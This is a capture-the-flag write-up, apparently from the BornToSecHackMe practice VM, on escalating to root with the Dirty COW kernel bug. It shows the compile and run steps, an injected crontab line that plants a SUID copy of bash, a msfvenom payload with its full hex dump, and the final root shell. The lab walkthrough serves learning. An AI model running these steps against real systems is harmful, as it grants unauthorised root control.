# dirtyc0w - /etc/cron & service cron restart

First, log in as the `zaz` user. Then, we create a file called `dirty_crontab.c.` This script will create a backup of `/etc/crontab` and edit the first line with a command that copies `/bin/bash` to the `/zaz/home` directory with root privileges.

```
zaz@BornToSecHackMe:~$ whoami
zaz
zaz@BornToSecHackMe:~$ id
uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
zaz@BornToSecHackMe:/tmp$ gcc -pthread dirty_crontab.c -o dirty -lcrypt
zaz@BornToSecHackMe:/tmp$ ./dirty 
/etc/crontab successfully backed up to /tmp/crontab.bak
mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/crontab to see if it was modified.

DON'T FORGET TO RESTORE! $ mv /tmp/crontab.bak /etc/crontab
Done! Check /etc/crontab to see if it was modified.

DON'T FORGET TO RESTORE! $ mv /tmp/crontab.bak /etc/crontab
```

Then, when we look at `/etc/crontab`, we see that it has been changed.

```
zaz@BornToSecHackMe:/tmp$ cat /etc/crontab
* * * * * root cp /bin/bash /home/zaz/rootshell && chmod 4755 /home/zaz/rootshell
#Vhe `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

Now that we have edited the crontab file, we need to reload it. To do so, we will use `exploit_me`. We will create a file called `dirty_crontab_reload.c` that creates a backup of `/home/zaz/exploit_me` and executes `service cron restart.`
We need to use `msfvenom` to create our payload.

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -platform Linux -p linux/x86/exec CMD="service cron restart" -f elf -a x86 -o payload
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder specified, outputting raw payload
Payload size: 56 bytes
Final size of elf file: 140 bytes
Saved as: payload
┌──(kali㉿kali)-[~]
└─$ xxd -i payload
unsigned char payload[] = {
	0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x8c, 0x00, 0x00, 0x00,
	0xc4, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x6a, 0x0b, 0x58, 0x99, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68,
	0x2f, 0x73, 0x68, 0x00, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52,
	0xe8, 0x15, 0x00, 0x00, 0x00, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65,
	0x20, 0x63, 0x72, 0x6f, 0x6e, 0x20, 0x72, 0x65, 0x73, 0x74, 0x61, 0x72,
	0x74, 0x00, 0x57, 0x53, 0x89, 0xe1, 0xcd, 0x80
};
unsigned int payload_len = 140;
```

We put our payload into our C file, and now we can run it.

```
zaz@BornToSecHackMe:/tmp$ gcc -pthread dirty_crontab_reload.c -o dirty -lcrypt 
zaz@BornToSecHackMe:/tmp$ ./dirty 
/home/zaz/exploit_me successfully backed up to /home/zaz/exploit_me.bak
mmap: b7fd9000
madvise 0

ptrace 0
Done! Check /home/zaz/exploit_me to see if it was modified.

DON'T FORGET TO RESTORE! $ mv /home/zaz/exploit_me.bak /home/zaz/exploit_me
Done! Check /home/zaz/exploit_me to see if it was modified.

DON'T FORGET TO RESTORE! $ mv /home/zaz/exploit_me.bak /home/zaz/exploit_me
```

The `exploit_me` binary has been modified, so we just need to run it to reload crontab. This will create our shell.

```
zaz@BornToSecHackMe:~$ ls
exploit_me  exploit_me.bak  mail
zaz@BornToSecHackMe:~$ ./exploit_me 
cron stop/waiting
cron start/running, process 2420
zaz@BornToSecHackMe:~$ ls
exploit_me  exploit_me.bak  mail  rootshell
```

We can now start `rootshell` with the `-p` flag to preserve SUID privileges.

```
zaz@BornToSecHackMe:~$ ./rootshell -p
rootshell-4.2# whoami
root
rootshell-4.2# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```

GG!